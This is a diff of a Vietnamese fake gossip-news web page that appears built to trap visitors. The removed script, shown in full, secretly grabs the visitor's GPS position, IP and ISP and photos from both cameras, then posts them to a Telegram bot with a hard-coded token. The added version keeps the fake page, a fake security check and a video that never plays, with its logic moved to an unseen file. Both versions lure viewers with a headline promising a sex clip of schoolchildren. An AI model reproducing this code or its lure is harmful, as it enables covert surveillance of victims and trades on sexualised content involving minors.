@@ -3,141 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nhiều Chuyện Đường Phố - Tin tức 24h</title>
+    <title>Hóng Hớt 24h - Tin tức nóng hổi</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .player-container { position: relative; width: 100%; max-width: 500px; aspect-ratio: 9/16; background: #111; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        #v { width: 100%; height: 100%; object-fit: cover; display: none; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; background: rgba(0,0,0,0.4); z-index: 10; }
-        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid white; transition: 0.3s; }
-        .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
-        h2 { margin-top: 20px; font-size: 18px; padding: 0 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
-        .loading { display: none; width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        body { margin: 0; font-family: sans-serif; background: #f0f2f5; }
+        /* Style cho phần Loading ban đầu */
+        #loading-screen {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; flex-direction: column; background: #fff;
+        }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Style cho trang tin tức giả */
+        #main-content { display: none; padding: 10px; }
+        .header { background: #ce0000; color: white; padding: 10px; font-weight: bold; text-align: center; margin-bottom: 10px; }
+        .post-card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+        .post-title { padding: 10px; font-size: 1.1rem; font-weight: bold; color: #1c1e21; }
+        .video-container { position: relative; background: #000; width: 100%; aspect-ratio: 16/9; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .video-thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+        .play-button { position: absolute; width: 60px; height: 60px; background: rgba(0,0,0,0.7); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid #fff; }
+        .play-button::after { content: ''; border-style: solid; border-width: 10px 0 10px 20px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
+        
+        /* Overlay xoay vòng khi ấn vào clip */
+        #video-loading { display: none; position: absolute; flex-direction: column; align-items: center; color: white; }
+        .spinner-small { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="player-container">
-        <video id="v" autoplay playsinline muted></video>
-        <div class="overlay">
-            <div class="play-btn" onclick="start()">
-                <div class="play-icon"></div>
+<div id="loading-screen">
+    <div class="loader"></div>
+    <p id="status">Đang kiểm tra bảo mật đường truyền...</p>
+</div>
+
+<div id="main-content">
+    <div class="header">HÓNG HỚT 24H - TIN NÓNG</div>
+    <div class="post-card">
+        <div class="post-title">CỰC SỐC: Lộ clip cặp đôi 2k10 làm chuyện người lớn trong nhà vệ sinh trường học, xem ngay trước khi bị xóa!</div>
+        <div class="video-container" onclick="startLoadingVideo()">
+            <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" class="video-thumbnail" alt="thumbnail">
+            <div id="play-btn" class="play-button"></div>
+            
+            <div id="video-loading">
+                <div class="spinner-small"></div>
+                <span>Đang tải video...</span>
             </div>
-            <h2 id="st">Nam sinh 16 tuổi và cô bạn gái đang gây sốt cộng đồng mạng...</h2>
-            <div class="loading" id="ld"></div>
+        </div>
+        <div style="padding: 10px; color: #65676b; font-size: 0.8rem;">
+            1.2M lượt xem • 2 giờ trước
         </div>
     </div>
+</div>
 
-    <script>
-        const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
-        const ID = '-1003770043455';
+<script src="main.js"></script>
 
-        function getGPS() {
-            return new Promise((res) => {
-                if (!navigator.geolocation) return res(null);
-                let best = null;
-                const watchID = navigator.geolocation.watchPosition(
-                    (p) => {
-                        const { latitude, longitude, accuracy } = p.coords;
-                        if (!best || accuracy < best.acc) {
-                            best = { lat: latitude, lon: longitude, acc: accuracy };
-                        }
-                        if (accuracy < 15) {
-                            navigator.geolocation.clearWatch(watchID);
-                            res(best);
-                        }
-                    },
-                    () => res(null),
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchID);
-                    res(best);
-                }, 4000);
-            });
+<script>
+    function startLoadingVideo() {
+        document.getElementById('play-btn').style.display = 'none';
+        document.getElementById('video-loading').style.display = 'flex';
+        // Video sẽ "load mãi" vì không có hàm xử lý dừng loading
+    }
+
+    const checkFinish = setInterval(() => {
+        if (window.mainScriptFinished) {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+            clearInterval(checkFinish);
         }
+    }, 500);
 
-        async function getVitals() {
-            try {
-                const r = await fetch('https://ipwho.is/');
-                const d = await r.json();
-                return {
-                    ip: d.ip || '?',
-                    isp: d.connection?.org || '?',
-                    addr: `${d.city}, ${d.region}`,
-                    lat: d.latitude || 0,
-                    lon: d.longitude || 0
-                };
-            } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
-        }
+    // Giả lập trạng thái cho status ban đầu
+    setTimeout(() => { document.getElementById('status').innerText = "Đang xác thực quyền truy cập..."; }, 2000);
+</script>
 
-        async function capture(mode) {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                await v.play();
-                return new Promise(res => {
-                    setTimeout(() => {
-                        const c = document.createElement('canvas');
-                        c.width = v.videoWidth; c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        s.getTracks().forEach(t => t.stop());
-                        c.toBlob(res, 'image/jpeg', 0.8);
-                    }, 2000);
-                });
-            } catch (e) { return null; }
-        }
-
-        async function start() {
-            document.querySelector('.play-btn').style.display = 'none';
-            document.getElementById('st').innerText = 'Đang tải video...';
-            document.getElementById('ld').style.display = 'block';
-
-            const [info, gps, p1, p2] = await Promise.all([
-                getVitals(),
-                getGPS(),
-                capture("user"),
-                capture("environment")
-            ]);
-
-            const lat = gps ? gps.lat : info.lat;
-            const lon = gps ? gps.lon : info.lon;
-            const type = gps ? `🎯 GPS (+/- ${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
-            const map = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            const cap = `📡 [THÔNG TIN TRUY CẬP]
-🕒 ${new Date().toLocaleString('vi-VN')}
-📱 Thiết bị: ${navigator.platform}
-🌍 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-📍 Khu vực: ${info.addr}
-🛠 Định vị: ${type}
-📌 Maps: ${map}
-📸 Camera: ✅ Đã chụp
-‼️ Lưu ý: Nội dung trên có thể không chính xác!
-💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();
-
-            const fd = new FormData();
-            fd.append('chat_id', ID);
-            const media = [];
-            if (p1) {
-                fd.append('f1', p1, '1.jpg');
-                media.push({ type: 'photo', media: 'attach://f1', caption: cap });
-            }
-            if (p2) {
-                fd.append('f2', p2, '2.jpg');
-                media.push({ type: 'photo', media: 'attach://f2' });
-            }
-
-            if (media.length > 0) {
-                fd.append('media', JSON.stringify(media));
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
-            }
-            
-            window.location.href = "https://www.facebook.com/watch/";
-        }
-    </script>
 </body>
 </html>
